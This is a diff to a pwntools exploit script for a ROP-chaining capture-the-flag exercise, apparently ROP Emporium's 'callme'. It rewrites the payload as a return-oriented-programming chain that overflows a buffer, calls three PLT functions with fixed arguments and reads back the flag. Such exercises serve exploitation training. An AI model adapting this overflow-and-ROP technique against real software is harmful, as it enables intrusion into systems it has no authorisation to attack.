@@ -20,22 +20,20 @@ def connection():
     return c
 
 BUFFER_SIZE = 32
+READ_SIZE = 512
 
 def make_call_chain(address):
     return [elf.symbols.usefulGadgets, 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d, address]
 
-def main():    
-    payload = flat \
-    ({
-        BUFFER_SIZE + context.bytes: \
-        [
-            make_call_chain(a)
-            for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]
-        ]
-    })
+def main():
+    rop = ROP(elf)
+    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
+    rop.raw([make_call_chain(a) for a in [elf.plt.callme_one, elf.plt.callme_two, elf.plt.callme_three]])
+    payload = rop.chain()
+    assert len(payload) <= READ_SIZE
 
     c = connection()
-    c.sendlineafter(b'> ', payload)
+    c.sendafter(b'> ', payload)
     print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())
 
 if __name__ == '__main__':
